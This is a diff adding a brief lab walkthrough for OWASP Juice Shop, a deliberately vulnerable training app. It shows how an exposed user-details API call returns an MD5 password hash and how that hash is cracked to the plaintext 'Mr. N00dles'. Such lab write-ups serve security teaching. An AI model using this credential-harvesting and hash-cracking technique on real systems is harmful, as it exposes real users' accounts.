@@ -1,0 +1,32 @@
+using the admin section we found earlier : http://localhost:3000/#/administration
+we can get the details about any user by monitoring network calls upon requesting for user details.
+
+xhr call to : http://localhost:3000/api/Users/8
+response : 
+---------------------------------------------------------------------------------------------
+data
+:
+{id: 8, email: "mc.safesearch@juice-sh.op", password: "b03f4b0ba8b458fa0acdc02cdb953bc8",…}
+createdAt
+:
+"2018-05-17T12:28:14.486Z"
+email
+:
+"mc.safesearch@juice-sh.op"
+id
+:
+8
+password
+:
+"b03f4b0ba8b458fa0acdc02cdb953bc8"
+updatedAt
+:
+"2018-05-17T12:28:14.486Z"
+status
+:
+"success"
+---------------------------------------------------------------------------------------------
+now using this password hash (MD5), we can get back the plaintext
+hash : b03f4b0ba8b458fa0acdc02cdb953bc8
+plaintext : Mr. N00dles
+
